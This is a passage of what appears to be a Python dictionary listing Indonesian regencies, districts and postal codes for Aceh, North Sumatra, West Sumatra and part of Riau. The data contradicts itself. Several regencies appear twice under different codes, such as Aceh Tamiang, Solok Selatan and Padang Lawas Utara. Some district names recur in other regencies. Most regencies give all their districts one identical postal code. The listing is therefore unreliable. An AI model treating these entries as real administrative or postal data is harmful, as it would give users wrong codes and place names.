        '110103': {'nama': 'TRUMON TENGAH', 'kodepos': '23776'},
        '110104': {'nama': 'BAKONGAN', 'kodepos': '23775'},
        '110105': {'nama': 'BAKONGAN TIMUR', 'kodepos': '23775'},
        '110106': {'nama': 'KOTA BAHAGIA', 'kodepos': '23773'},
        '110107': {'nama': 'KLUET SELATAN', 'kodepos': '23772'},
        '110108': {'nama': 'KLUET TIMUR', 'kodepos': '23772'},
        '110109': {'nama': 'KLUET UTARA', 'kodepos': '23772'},
        '110110': {'nama': 'PASIE RAJA', 'kodepos': '23774'},
        '110111': {'nama': 'KLUET TENGAH', 'kodepos': '23772'},
    }},
    '1102': {'kab': 'KAB. ACEH TENGGARA', 'kec': {
        '110201': {'nama': 'LAWE ALAS', 'kodepos': '24652'},
        '110202': {'nama': 'LAWE SIGALA-GALA', 'kodepos': '24652'},
        '110203': {'nama': 'BABUL RAHMAH', 'kodepos': '24652'},
        '110204': {'nama': 'TANOH ALAS', 'kodepos': '24652'},
        '110205': {'nama': 'LAWE SUMUR', 'kodepos': '24652'},
    }},
    '1103': {'kab': 'KAB. ACEH TIMUR', 'kec': {
        '110301': {'nama': 'DARUL AMAN', 'kodepos': '24452'},
        '110302': {'nama': 'JULOK', 'kodepos': '24452'},
        '110303': {'nama': 'IDI RAYEUK', 'kodepos': '24452'},
        '110304': {'nama': 'PEUREULAK', 'kodepos': '24452'},
    }},
    '1104': {'kab': 'KAB. ACEH TENGAH', 'kec': {
        '110401': {'nama': 'BEBESEN', 'kodepos': '24552'},
        '110402': {'nama': 'BINTANG', 'kodepos': '24552'},
        '110403': {'nama': 'JAGONG JEGET', 'kodepos': '24552'},
        '110404': {'nama': 'KETOL', 'kodepos': '24552'},
        '110405': {'nama': 'KUTE PANANG', 'kodepos': '24552'},
    }},
    '1105': {'kab': 'KAB. ACEH BARAT', 'kec': {
        '110501': {'nama': 'ARONGAN LAMBALEK', 'kodepos': '23652'},
        '110502': {'nama': 'BUBON', 'kodepos': '23652'},
        '110503': {'nama': 'JOHAN PAHLAWAN', 'kodepos': '23652'},
        '110504': {'nama': 'KAWAY XVI', 'kodepos': '23652'},
        '110505': {'nama': 'MEUREUBO', 'kodepos': '23652'},
    }},
    '1106': {'kab': 'KAB. ACEH BESAR', 'kec': {
        '110601': {'nama': 'KRUENG BARONA JAYA', 'kodepos': '23352'},
        '110602': {'nama': 'KUTA MALAKA', 'kodepos': '23352'},
        '110603': {'nama': 'LEMBAH SEULAWAH', 'kodepos': '23352'},
        '110604': {'nama': 'MESJID RAYA', 'kodepos': '23352'},
        '110605': {'nama': 'SEULIMEUM', 'kodepos': '23352'},
    }},
    '1107': {'kab': 'KAB. PIDIE', 'kec': {
        '110701': {'nama': 'MUTIARA', 'kodepos': '24152'},
        '110702': {'nama': 'MILA', 'kodepos': '24152'},
        '110703': {'nama': 'PADANG TIJI', 'kodepos': '24152'},
        '110704': {'nama': 'DELIMA', 'kodepos': '24152'},
        '110705': {'nama': 'GEUMPANG', 'kodepos': '24152'},
    }},
    '1108': {'kab': 'KAB. ACEH UTARA', 'kec': {
        '110801': {'nama': 'LANGKAHAN', 'kodepos': '24352'},
        '110802': {'nama': 'SAWANG', 'kodepos': '24352'},
        '110803': {'nama': 'NISAM', 'kodepos': '24352'},
        '110804': {'nama': 'NISAM ANTARA', 'kodepos': '24352'},
        '110805': {'nama': 'SAMUDERA', 'kodepos': '24352'},
    }},
    '1109': {'kab': 'KAB. SIMEULUE', 'kec': {
        '110901': {'nama': 'ALAFAN', 'kodepos': '23852'},
        '110902': {'nama': 'SALANG', 'kodepos': '23852'},
        '110903': {'nama': 'SIMEULUE BARAT', 'kodepos': '23852'},
        '110904': {'nama': 'SIMEULUE TENGAH', 'kodepos': '23852'},
    }},
    '1110': {'kab': 'KAB. ACEH SINGKIL', 'kec': {
        '111001': {'nama': 'GUNUNG MERIAH', 'kodepos': '24752'},
        '111002': {'nama': 'SINGKIL', 'kodepos': '24752'},
        '111003': {'nama': 'SINGKIL UTARA', 'kodepos': '24752'},
        '111004': {'nama': 'KUALA BARU', 'kodepos': '24752'},
    }},
    '1111': {'kab': 'KAB. BENER MERIAH', 'kec': {
        '111101': {'nama': 'BUKIT', 'kodepos': '24552'},
        '111102': {'nama': 'PERMATA', 'kodepos': '24552'},
        '111103': {'nama': 'BENER KELIPAH', 'kodepos': '24552'},
        '111104': {'nama': 'TIMANG GAJAH', 'kodepos': '24552'},
    }},
    '1112': {'kab': 'KAB. ACEH JAYA', 'kec': {
        '111201': {'nama': 'CALANG', 'kodepos': '23652'},
        '111202': {'nama': 'JAYA', 'kodepos': '23652'},
        '111203': {'nama': 'KRUENG SABEE', 'kodepos': '23652'},
        '111204': {'nama': 'PASIE RAYA', 'kodepos': '23652'},
    }},
    '1113': {'kab': 'KAB. GAYO LUES', 'kec': {
        '111301': {'nama': 'BLANG KEJEREN', 'kodepos': '24652'},
        '111302': {'nama': 'KUTA PANJANG', 'kodepos': '24652'},
        '111303': {'nama': 'RIMBA', 'kodepos': '24652'},
        '111304': {'nama': 'TERANGUN', 'kodepos': '24652'},
    }},
    '1114': {'kab': 'KAB. ACEH TAMIANG', 'kec': {
        '111401': {'nama': 'BENDAHARA', 'kodepos': '24452'},
        '111402': {'nama': 'KARANG BARU', 'kodepos': '24452'},
        '111403': {'nama': 'KEJURUAN MUDO', 'kodepos': '24452'},
        '111404': {'nama': 'MANYAK PAYED', 'kodepos': '24452'},
    }},
    '1115': {'kab': 'KAB. NAGAN RAYA', 'kec': {
        '111501': {'nama': 'BEUTONG', 'kodepos': '23652'},
        '111502': {'nama': 'DARUL MAKMUR', 'kodepos': '23652'},
        '111503': {'nama': 'KUALA', 'kodepos': '23652'},
        '111504': {'nama': 'SAWANG', 'kodepos': '23652'},
    }},
    '1116': {'kab': 'KAB. ACEH BARAT DAYA', 'kec': {
        '111601': {'nama': 'BABAH ROT', 'kodepos': '23652'},
        '111602': {'nama': 'BLANG PIDIE', 'kodepos': '23652'},
        '111603': {'nama': 'JEUMPA', 'kodepos': '23652'},
        '111604': {'nama': 'KUALA BATEE', 'kodepos': '23652'},
    }},
    '1117': {'kab': 'KAB. ACEH TAMIANG', 'kec': {
        '111701': {'nama': 'BENDAHARA', 'kodepos': '24452'},
        '111702': {'nama': 'MANYAK PAYED', 'kodepos': '24452'},
        '111703': {'nama': 'SEURAH BAYU', 'kodepos': '24452'},
        '111704': {'nama': 'TAMIANG HULU', 'kodepos': '24452'},
    }},
    '1171': {'kab': 'KOTA BANDA ACEH', 'kec': {
        '117101': {'nama': 'BAITURRAHMAN', 'kodepos': '23242'},
        '117102': {'nama': 'KUTA ALAM', 'kodepos': '23121'},
        '117103': {'nama': 'MEURAXA', 'kodepos': '23233'},
        '117104': {'nama': 'SYIAH KUALA', 'kodepos': '23112'},
        '117105': {'nama': 'LUENG BATA', 'kodepos': '23246'},
        '117106': {'nama': 'KUTA RAJA', 'kodepos': '23121'},
        '117107': {'nama': 'JAYA BARU', 'kodepos': '23223'},
        '117108': {'nama': 'ULEE KARENG', 'kodepos': '23112'},
    }},
    '1172': {'kab': 'KOTA SABANG', 'kec': {
        '117201': {'nama': 'SUKAJAYA', 'kodepos': '23521'},
        '117202': {'nama': 'SUKAKARYA', 'kodepos': '23521'},
    }},
    '1173': {'kab': 'KOTA LHOKSEUMAWE', 'kec': {
        '117301': {'nama': 'MUARA DUA', 'kodepos': '24321'},
        '117302': {'nama': 'BANDA SAKTI', 'kodepos': '24321'},
        '117303': {'nama': 'BLANG MANGAT', 'kodepos': '24321'},
        '117304': {'nama': 'LHOKSEUMAWE', 'kodepos': '24321'},
    }},
    '1174': {'kab': 'KOTA LANGSA', 'kec': {
        '117401': {'nama': 'LANGSA BARAT', 'kodepos': '24421'},
        '117402': {'nama': 'LANGSA KOTA', 'kodepos': '24421'},
        '117403': {'nama': 'LANGSA LAMA', 'kodepos': '24421'},
        '117404': {'nama': 'LANGSA TIMUR', 'kodepos': '24421'},
    }},
    '1175': {'kab': 'KOTA SUBULUSSALAM', 'kec': {
        '117501': {'nama': 'SUBULUSSALAM', 'kodepos': '24721'},
        '117502': {'nama': 'SIMPANG KIRI', 'kodepos': '24721'},
        '117503': {'nama': 'PENANGGALAN', 'kodepos': '24721'},
        '117504': {'nama': 'RUNDENG', 'kodepos': '24721'},
    }},

    # ===== SUMATERA UTARA (12) =====
    '1201': {'kab': 'KAB. MANDAILING NATAL', 'kec': {
        '120101': {'nama': 'BATAHAN', 'kodepos': '22982'},
        '120102': {'nama': 'BATANG NATAL', 'kodepos': '22982'},
        '120103': {'nama': 'KOTANOPAN', 'kodepos': '22982'},
        '120104': {'nama': 'MUARA BATANG GADIS', 'kodepos': '22982'},
    }},
    '1202': {'kab': 'KAB. TAPANULI SELATAN', 'kec': {
        '120201': {'nama': 'ANGKOLA BARAT', 'kodepos': '22783'},
        '120202': {'nama': 'ANGKOLA SELATAN', 'kodepos': '22783'},
        '120203': {'nama': 'ANGKOLA TIMUR', 'kodepos': '22783'},
        '120204': {'nama': 'ARSE', 'kodepos': '22783'},
        '120205': {'nama': 'BATANG ANGKOLA', 'kodepos': '22783'},
    }},
    '1203': {'kab': 'KAB. TAPANULI UTARA', 'kec': {
        '120301': {'nama': 'ADIAN KOTING', 'kodepos': '22483'},
        '120302': {'nama': 'GAROGA', 'kodepos': '22483'},
        '120303': {'nama': 'MUARA', 'kodepos': '22483'},
        '120304': {'nama': 'PAGARAN', 'kodepos': '22483'},
        '120305': {'nama': 'PANGARIBUAN', 'kodepos': '22483'},
    }},
    '1204': {'kab': 'KAB. TAPANULI TENGAH', 'kec': {
        '120401': {'nama': 'ANDAM DEWI', 'kodepos': '22683'},
        '120402': {'nama': 'BADIRI', 'kodepos': '22683'},
        '120403': {'nama': 'BARUS', 'kodepos': '22683'},
        '120404': {'nama': 'KOLANG', 'kodepos': '22683'},
        '120405': {'nama': 'LUMUT', 'kodepos': '22683'},
    }},
    '1205': {'kab': 'KAB. LANGKAT', 'kec': {
        '120501': {'nama': 'BABALAN', 'kodepos': '20852'},
        '120502': {'nama': 'BATANG SERANGAN', 'kodepos': '20852'},
        '120503': {'nama': 'BESITANG', 'kodepos': '20852'},
        '120504': {'nama': 'BINJAI', 'kodepos': '20852'},
        '120505': {'nama': 'BRANDAN BARAT', 'kodepos': '20852'},
    }},
    '1206': {'kab': 'KAB. KARO', 'kec': {
        '120601': {'nama': 'BARUSJAHE', 'kodepos': '22183'},
        '120602': {'nama': 'BERASTAGI', 'kodepos': '22183'},
        '120603': {'nama': 'KABANJAHE', 'kodepos': '22183'},
        '120604': {'nama': 'LAUBALENG', 'kodepos': '22183'},
        '120605': {'nama': 'MERDEKA', 'kodepos': '22183'},
    }},
    '1207': {'kab': 'KAB. DELI SERDANG', 'kec': {
        '120701': {'nama': 'BANGUN PURBA', 'kodepos': '20583'},
        '120702': {'nama': 'BATANG KUIS', 'kodepos': '20583'},
        '120703': {'nama': 'BIRU-BIRU', 'kodepos': '20583'},
        '120704': {'nama': 'DELI TUA', 'kodepos': '20583'},
        '120705': {'nama': 'GALANG', 'kodepos': '20583'},
    }},
    '1208': {'kab': 'KAB. SIMALUNGUN', 'kec': {
        '120801': {'nama': 'GIRSANG SIPANGAN BOLON', 'kodepos': '21183'},
        '120802': {'nama': 'GUNUNG MALELA', 'kodepos': '21183'},
        '120803': {'nama': 'GUNUNG MALIGAS', 'kodepos': '21183'},
        '120804': {'nama': 'HUTABAYU RAJA', 'kodepos': '21183'},
        '120805': {'nama': 'JAWA MARAJA BAH JAMBI', 'kodepos': '21183'},
    }},
    '1209': {'kab': 'KAB. ASAHAN', 'kec': {
        '120901': {'nama': 'AIR BATU', 'kodepos': '21283'},
        '120902': {'nama': 'AIR JOMAN', 'kodepos': '21283'},
        '120903': {'nama': 'BANDAR PULAU', 'kodepos': '21283'},
        '120904': {'nama': 'KISARAN BARAT', 'kodepos': '21283'},
        '120905': {'nama': 'KISARAN TIMUR', 'kodepos': '21283'},
    }},
    '1210': {'kab': 'KAB. LABUHAN BATU', 'kec': {
        '121001': {'nama': 'BILAH HILIR', 'kodepos': '21483'},
        '121002': {'nama': 'BILAH HULU', 'kodepos': '21483'},
        '121003': {'nama': 'PANAI HILIR', 'kodepos': '21483'},
        '121004': {'nama': 'PANAI TENGAH', 'kodepos': '21483'},
        '121005': {'nama': 'RANTAU SELATAN', 'kodepos': '21483'},
    }},
    '1211': {'kab': 'KAB. DAIRI', 'kec': {
        '121101': {'nama': 'SIDIKALANG', 'kodepos': '22283'},
        '121102': {'nama': 'SUMBER', 'kodepos': '22283'},
        '121103': {'nama': 'TANAH PINEM', 'kodepos': '22283'},
        '121104': {'nama': 'TIGA LINGGA', 'kodepos': '22283'},
    }},
    '1212': {'kab': 'KAB. TOBA SAMOSIR', 'kec': {
        '121201': {'nama': 'BALIGE', 'kodepos': '22383'},
        '121202': {'nama': 'LAGUBOTI', 'kodepos': '22383'},
        '121203': {'nama': 'PANGURURAN', 'kodepos': '22383'},
        '121204': {'nama': 'PORSEA', 'kodepos': '22383'},
        '121205': {'nama': 'SILIMA PUNGGA-PUNGGA', 'kodepos': '22383'},
    }},
    '1213': {'kab': 'KAB. PADANG LAWAS UTARA', 'kec': {
        '121301': {'nama': 'BATANG ONANG', 'kodepos': '22783'},
        '121302': {'nama': 'DOLOK', 'kodepos': '22783'},
        '121303': {'nama': 'HALONGONAN', 'kodepos': '22783'},
        '121304': {'nama': 'PADANG BOLAK', 'kodepos': '22783'},
    }},
    '1214': {'kab': 'KAB. PADANG LAWAS', 'kec': {
        '121401': {'nama': 'BARUMUN', 'kodepos': '22783'},
        '121402': {'nama': 'BARUMUN SELATAN', 'kodepos': '22783'},
        '121403': {'nama': 'BARUMUN TENGAH', 'kodepos': '22783'},
        '121404': {'nama': 'LUBUK BARUMUN', 'kodepos': '22783'},
    }},
    '1215': {'kab': 'KAB. PAKPAK BHARAT', 'kec': {
        '121501': {'nama': 'KERAJAAN', 'kodepos': '22283'},
        '121502': {'nama': 'SALAK', 'kodepos': '22283'},
        '121503': {'nama': 'SITELU TALI URANG JEHE', 'kodepos': '22283'},
        '121504': {'nama': 'SUKAHASAP', 'kodepos': '22283'},
    }},
    '1216': {'kab': 'KAB. SAMOSIR', 'kec': {
        '121601': {'nama': 'PANGURURAN', 'kodepos': '22383'},
        '121602': {'nama': 'RONGUR NIHUTA', 'kodepos': '22383'},
        '121603': {'nama': 'SIANJUR MULA MULA', 'kodepos': '22383'},
        '121604': {'nama': 'SITIO-TIO', 'kodepos': '22383'},
    }},
    '1217': {'kab': 'KAB. SERDANG BEDAGAI', 'kec': {
        '121701': {'nama': 'BANDAR KHALIFAH', 'kodepos': '20983'},
        '121702': {'nama': 'BINTANG BAYU', 'kodepos': '20983'},
        '121703': {'nama': 'DOLOK MASIHUL', 'kodepos': '20983'},
        '121704': {'nama': 'PERBAUNGAN', 'kodepos': '20983'},
    }},
    '1218': {'kab': 'KAB. BATU BARA', 'kec': {
        '121801': {'nama': 'AIR PUTIH', 'kodepos': '21252'},
        '121802': {'nama': 'LIMAPULUH', 'kodepos': '21252'},
        '121803': {'nama': 'MEDANG DERAS', 'kodepos': '21252'},
        '121804': {'nama': 'SEI SUKA', 'kodepos': '21252'},
    }},
    '1219': {'kab': 'KAB. LABUHAN BATU SELATAN', 'kec': {
        '121901': {'nama': 'KAMPUNG RAKYAT', 'kodepos': '21483'},
        '121902': {'nama': 'KOTAPINANG', 'kodepos': '21483'},
        '121903': {'nama': 'SUNGAI KANAN', 'kodepos': '21483'},
        '121904': {'nama': 'TORGAMBA', 'kodepos': '21483'},
    }},
    '1220': {'kab': 'KAB. LABUHAN BATU UTARA', 'kec': {
        '122001': {'nama': 'A KUALA', 'kodepos': '21483'},
        '122002': {'nama': 'NA IX-X', 'kodepos': '21483'},
        '122003': {'nama': 'MARITIM', 'kodepos': '21483'},
        '122004': {'nama': 'MERBAU', 'kodepos': '21483'},
    }},
    '1221': {'kab': 'KAB. PADANG LAWAS UTARA', 'kec': {
        '122101': {'nama': 'DOLOK', 'kodepos': '22783'},
        '122102': {'nama': 'HALONGONAN', 'kodepos': '22783'},
        '122103': {'nama': 'PADANG BOLAK', 'kodepos': '22783'},
        '122104': {'nama': 'PADANG BOLAK JULU', 'kodepos': '22783'},
    }},
    '1271': {'kab': 'KOTA MEDAN', 'kec': {
        '127101': {'nama': 'MEDAN BARAT', 'kodepos': '20121'},
        '127102': {'nama': 'MEDAN DELI', 'kodepos': '20111'},
        '127103': {'nama': 'MEDAN HELVETIA', 'kodepos': '20123'},
        '127104': {'nama': 'MEDAN JOHOR', 'kodepos': '20144'},
        '127105': {'nama': 'MEDAN KOTA', 'kodepos': '20213'},
        '127106': {'nama': 'MEDAN LABUHAN', 'kodepos': '20115'},
        '127107': {'nama': 'MEDAN MAIMUN', 'kodepos': '20112'},
        '127108': {'nama': 'MEDAN MARELAN', 'kodepos': '20142'},
        '127109': {'nama': 'MEDAN PERJUANGAN', 'kodepos': '20233'},
        '127110': {'nama': 'MEDAN PETISAH', 'kodepos': '20112'},
        '127111': {'nama': 'MEDAN POLONIA', 'kodepos': '20132'},
        '127112': {'nama': 'MEDAN SELAYANG', 'kodepos': '20131'},
        '127113': {'nama': 'MEDAN SUNGGAL', 'kodepos': '20133'},
        '127114': {'nama': 'MEDAN TEMBUNG', 'kodepos': '20224'},
        '127115': {'nama': 'MEDAN TUNTUNGAN', 'kodepos': '20141'},
        '127116': {'nama': 'MEDAN AMPLAS', 'kodepos': '20221'},
        '127117': {'nama': 'MEDAN BELAWAN', 'kodepos': '20412'},
        '127118': {'nama': 'MEDAN DENAI', 'kodepos': '20228'},
        '127119': {'nama': 'MEDAN AREA', 'kodepos': '20214'},
        '127120': {'nama': 'MEDAN TIMUR', 'kodepos': '20234'},
    }},
    '1272': {'kab': 'KOTA PEMATANGSIANTAR', 'kec': {
        '127201': {'nama': 'SIANTAR MARIHAT', 'kodepos': '21121'},
        '127202': {'nama': 'SIANTAR MARIMBUN', 'kodepos': '21121'},
        '127203': {'nama': 'SIANTAR SELATAN', 'kodepos': '21121'},
        '127204': {'nama': 'SIANTAR TIMUR', 'kodepos': '21121'},
        '127205': {'nama': 'SIANTAR UTARA', 'kodepos': '21121'},
    }},
    '1273': {'kab': 'KOTA SIBOLGA', 'kec': {
        '127301': {'nama': 'SIBOLGA KOTA', 'kodepos': '22521'},
        '127302': {'nama': 'SIBOLGA SAMBAS', 'kodepos': '22521'},
        '127303': {'nama': 'SIBOLGA SELATAN', 'kodepos': '22521'},
        '127304': {'nama': 'SIBOLGA UTARA', 'kodepos': '22521'},
    }},
    '1274': {'kab': 'KOTA TANJUNGBALAI', 'kec': {
        '127401': {'nama': 'TANJUNGBALAI BARAT', 'kodepos': '21321'},
        '127402': {'nama': 'TANJUNGBALAI KOTA', 'kodepos': '21321'},
        '127403': {'nama': 'TANJUNGBALAI SELATAN', 'kodepos': '21321'},
        '127404': {'nama': 'TANJUNGBALAI UTARA', 'kodepos': '21321'},
    }},
    '1275': {'kab': 'KOTA BINJAI', 'kec': {
        '127501': {'nama': 'BINJAI BARAT', 'kodepos': '20721'},
        '127502': {'nama': 'BINJAI KOTA', 'kodepos': '20721'},
        '127503': {'nama': 'BINJAI TIMUR', 'kodepos': '20721'},
        '127504': {'nama': 'BINJAI UTARA', 'kodepos': '20721'},
    }},
    '1276': {'kab': 'KOTA GUNUNGSITOLI', 'kec': {
        '127601': {'nama': 'GUNUNGSITOLI', 'kodepos': '22821'},
        '127602': {'nama': 'GUNUNGSITOLI ALOOA', 'kodepos': '22821'},
        '127603': {'nama': 'GUNUNGSITOLI BARAT', 'kodepos': '22821'},
        '127604': {'nama': 'GUNUNGSITOLI SELATAN', 'kodepos': '22821'},
        '127605': {'nama': 'GUNUNGSITOLI UTARA', 'kodepos': '22821'},
    }},

    # ===== SUMATERA BARAT (13) =====
    '1301': {'kab': 'KAB. PESISIR SELATAN', 'kec': {
        '130101': {'nama': 'BASAHAN', 'kodepos': '25652'},
        '130102': {'nama': 'BATANG KAPAS', 'kodepos': '25652'},
        '130103': {'nama': 'KOTO XI TARUSAN', 'kodepos': '25652'},
        '130104': {'nama': 'LENGAYANG', 'kodepos': '25652'},
        '130105': {'nama': 'LINGGO SARI BAGANTI', 'kodepos': '25652'},
    }},
    '1302': {'kab': 'KAB. SOLOK', 'kec': {
        '130201': {'nama': 'GUNUNG TALANG', 'kodepos': '27352'},
        '130202': {'nama': 'KOTO PARIK GADANG DIATEH', 'kodepos': '27352'},
        '130203': {'nama': 'LEMBANG JAYA', 'kodepos': '27352'},
        '130204': {'nama': 'PANTAI CERMIN', 'kodepos': '27352'},
        '130205': {'nama': 'SOLOK', 'kodepos': '27352'},
    }},
    '1303': {'kab': 'KAB. SAWAHLUNTO SIJUNJUNG', 'kec': {
        '130301': {'nama': 'SIJUNJUNG', 'kodepos': '27552'},
        '130302': {'nama': 'KAMANG BARU', 'kodepos': '27552'},
        '130303': {'nama': 'TANJUNG GADANG', 'kodepos': '27552'},
        '130304': {'nama': 'PADANG SIRUSUAK', 'kodepos': '27552'},
    }},
    '1304': {'kab': 'KAB. TANAH DATAR', 'kec': {
        '130401': {'nama': 'BATIPUH', 'kodepos': '27252'},
        '130402': {'nama': 'BATIPUH SELATAN', 'kodepos': '27252'},
        '130403': {'nama': 'LIMA KAUM', 'kodepos': '27252'},
        '130404': {'nama': 'PADANG GANTING', 'kodepos': '27252'},
        '130405': {'nama': 'PARIANGAN', 'kodepos': '27252'},
    }},
    '1305': {'kab': 'KAB. PADANG PARIAMAN', 'kec': {
        '130501': {'nama': 'BATANG ANAI', 'kodepos': '25552'},
        '130502': {'nama': 'LUBUK ALUNG', 'kodepos': '25552'},
        '130503': {'nama': 'NAN SABARIS', 'kodepos': '25552'},
        '130504': {'nama': 'PADANG SAGO', 'kodepos': '25552'},
        '130505': {'nama': 'VII KOTO SUNGAI SARIK', 'kodepos': '25552'},
    }},
    '1306': {'kab': 'KAB. AGAM', 'kec': {
        '130601': {'nama': 'TANJUNG MUTIARA', 'kodepos': '26452'},
        '130602': {'nama': 'LUBUK BASUNG', 'kodepos': '26452'},
        '130603': {'nama': 'BASO', 'kodepos': '26452'},
        '130604': {'nama': 'IV KOTO', 'kodepos': '26452'},
        '130605': {'nama': 'MANINJAU', 'kodepos': '26452'},
    }},
    '1307': {'kab': 'KAB. LIMA PULUH KOTA', 'kec': {
        '130701': {'nama': 'AKABILURU', 'kodepos': '26252'},
        '130702': {'nama': 'BUKIK BARISAN', 'kodepos': '26252'},
        '130703': {'nama': 'GUGUAK', 'kodepos': '26252'},
        '130704': {'nama': 'HARAU', 'kodepos': '26252'},
        '130705': {'nama': 'KOTO TINGGI', 'kodepos': '26252'},
    }},
    '1308': {'kab': 'KAB. PASAMAN', 'kec': {
        '130801': {'nama': 'BONJOL', 'kodepos': '26352'},
        '130802': {'nama': 'LUBUK SIKAPING', 'kodepos': '26352'},
        '130803': {'nama': 'MAPI TAROM', 'kodepos': '26352'},
        '130804': {'nama': 'PASAMAN', 'kodepos': '26352'},
        '130805': {'nama': 'RAO', 'kodepos': '26352'},
    }},
    '1309': {'kab': 'KAB. SOLOK SELATAN', 'kec': {
        '130901': {'nama': 'KOTO PARIK GADANG DIATEH', 'kodepos': '27352'},
        '130902': {'nama': 'PADANG GANTING', 'kodepos': '27352'},
        '130903': {'nama': 'PANTAI CERMIN', 'kodepos': '27352'},
        '130904': {'nama': 'SANGIR', 'kodepos': '27352'},
    }},
    '1310': {'kab': 'KAB. DHARMASRAYA', 'kec': {
        '131001': {'nama': 'ASAM JUJUHAN', 'kodepos': '27652'},
        '131002': {'nama': 'KOTO BARU', 'kodepos': '27652'},
        '131003': {'nama': 'PADANG LAWEH', 'kodepos': '27652'},
        '131004': {'nama': 'PULAU PUNJUNG', 'kodepos': '27652'},
    }},
    '1311': {'kab': 'KAB. PASAMAN BARAT', 'kec': {
        '131101': {'nama': 'LEMBAH MELINTANG', 'kodepos': '26352'},
        '131102': {'nama': 'PASAMAN', 'kodepos': '26352'},
        '131103': {'nama': 'RANAH BATAHAN', 'kodepos': '26352'},
        '131104': {'nama': 'SUNGAI AUR', 'kodepos': '26352'},
    }},
    '1312': {'kab': 'KAB. SOLOK SELATAN', 'kec': {
        '131201': {'nama': 'SANGIR', 'kodepos': '27352'},
        '131202': {'nama': 'SANGIR BATANG HARI', 'kodepos': '27352'},
        '131203': {'nama': 'SANGIR JUJUAN', 'kodepos': '27352'},
        '131204': {'nama': 'SANGIR LUBUK', 'kodepos': '27352'},
    }},
    '1371': {'kab': 'KOTA PADANG', 'kec': {
        '137101': {'nama': 'KOTO TANGAH', 'kodepos': '25121'},
        '137102': {'nama': 'LUBUK BEGALUNG', 'kodepos': '25121'},
        '137103': {'nama': 'NANGGALO', 'kodepos': '25121'},
        '137104': {'nama': 'PADANG BARAT', 'kodepos': '25121'},
        '137105': {'nama': 'PADANG SELATAN', 'kodepos': '25121'},
        '137106': {'nama': 'PADANG TIMUR', 'kodepos': '25121'},
        '137107': {'nama': 'PADANG UTARA', 'kodepos': '25121'},
        '137108': {'nama': 'PAUH', 'kodepos': '25121'},
    }},
    '1372': {'kab': 'KOTA SOLOK', 'kec': {
        '137201': {'nama': 'KOTA SOLOK', 'kodepos': '27321'},
        '137202': {'nama': 'TANJUNG HARAPAN', 'kodepos': '27321'},
    }},
    '1373': {'kab': 'KOTA SAWAHLUNTO', 'kec': {
        '137301': {'nama': 'LEMBANG SEGAR', 'kodepos': '27421'},
        '137302': {'nama': 'SAWAHLUNTO', 'kodepos': '27421'},
        '137303': {'nama': 'SILUNGKANG', 'kodepos': '27421'},
    }},
    '1374': {'kab': 'KOTA PADANG PANJANG', 'kec': {
        '137401': {'nama': 'PADANG PANJANG BARAT', 'kodepos': '27121'},
        '137402': {'nama': 'PADANG PANJANG TIMUR', 'kodepos': '27121'},
    }},
    '1375': {'kab': 'KOTA BUKITTINGGI', 'kec': {
        '137501': {'nama': 'AUR BIRUGO TIGO BALEH', 'kodepos': '26121'},
        '137502': {'nama': 'GUGUK PANJANG', 'kodepos': '26121'},
        '137503': {'nama': 'MANDIANGIN KOTO SELAYAN', 'kodepos': '26121'},
    }},
    '1376': {'kab': 'KOTA PAYAKUMBUH', 'kec': {
        '137601': {'nama': 'PAYAKUMBUH BARAT', 'kodepos': '26221'},
        '137602': {'nama': 'PAYAKUMBUH SELATAN', 'kodepos': '26221'},
        '137603': {'nama': 'PAYAKUMBUH TIMUR', 'kodepos': '26221'},
        '137604': {'nama': 'PAYAKUMBUH UTARA', 'kodepos': '26221'},
    }},
    '1377': {'kab': 'KOTA PARIAMAN', 'kec': {
        '137701': {'nama': 'PARIAMAN SELATAN', 'kodepos': '25521'},
        '137702': {'nama': 'PARIAMAN TENGAH', 'kodepos': '25521'},
        '137703': {'nama': 'PARIAMAN UTARA', 'kodepos': '25521'},
    }},

    # ===== RIAU (14) =====
    '1401': {'kab': 'KAB. KAMPAR', 'kec': {
        '140101': {'nama': 'BANGKINANG KOTA', 'kodepos': '28452'},
        '140102': {'nama': 'BANGKINANG', 'kodepos': '28452'},
        '140103': {'nama': 'KAMPAR', 'kodepos': '28452'},
        '140104': {'nama': 'KAMPAR KIRI', 'kodepos': '28452'},
        '140105': {'nama': 'KAMPAR KIRI HILIR', 'kodepos': '28452'},
    }},
    '1402': {'kab': 'KAB. INDRAGIRI HULU', 'kec': {
        '140201': {'nama': 'BATANG CENAKU', 'kodepos': '29352'},
        '140202': {'nama': 'BATANG GANSAL', 'kodepos': '29352'},
        '140203': {'nama': 'KELAYANG', 'kodepos': '29352'},
        '140204': {'nama': 'KUALA CENAKU', 'kodepos': '29352'},
        '140205': {'nama': 'LIRIK', 'kodepos': '29352'},
    }},
    '1403': {'kab': 'KAB. INDRAGIRI HILIR', 'kec': {
        '140301': {'nama': 'BATANG TUAKA', 'kodepos': '29252'},
        '140302': {'nama': 'GAUNG ANAK SERKA', 'kodepos': '29252'},
        '140303': {'nama': 'GAUNG', 'kodepos': '29252'},
        '140304': {'nama': 'KATEMAN', 'kodepos': '29252'},
        '140305': {'nama': 'KUALA INDRAGIRI', 'kodepos': '29252'},
    }},
    '1404': {'kab': 'KAB. PELALAWAN', 'kec': {
        '140401': {'nama': 'BANDAR PETALANGAN', 'kodepos': '28352'},
        '140402': {'nama': 'BANDAR SEIKIJANG', 'kodepos': '28352'},
        '140403': {'nama': 'KUALA KAMPAR', 'kodepos': '28352'},
        '140404': {'nama': 'LANGGAM', 'kodepos': '28352'},
        '140405': {'nama': 'PANGKALAN KERINCI', 'kodepos': '28352'},
    }},
    '1405': {'kab': 'KAB. SIAK', 'kec': {
        '140501': {'nama': 'BUNGA RAYA', 'kodepos': '28752'},
        '140502': {'nama': 'DAYUN', 'kodepos': '28752'},
        '140503': {'nama': 'KANDIS', 'kodepos': '28752'},
        '140504': {'nama': 'KERINCI KANAN', 'kodepos': '28752'},
        '140505': {'nama': 'KOTO GASIB', 'kodepos': '28752'},
    }},
    '1406': {'kab': 'KAB. KUANTAN SINGINGI', 'kec': {
        '140601': {'nama': 'BENAI', 'kodepos': '29552'},
        '140602': {'nama': 'CERENTI', 'kodepos': '29552'},
        '140603': {'nama': 'GUNUNG TOAR', 'kodepos': '29552'},
        '140604': {'nama': 'INUMAN', 'kodepos': '29552'},
        '140605': {'nama': 'KUALA KAMPAR', 'kodepos': '29552'},
    }},
    '1407': {'kab': 'KAB. ROKAN HULU', 'kec': {
        '140701': {'nama': 'BONAI DARUSSALAM', 'kodepos': '28552'},
        '140702': {'nama': 'KABUN', 'kodepos': '28552'},
        '140703': {'nama': 'KEPENUHAN', 'kodepos': '28552'},
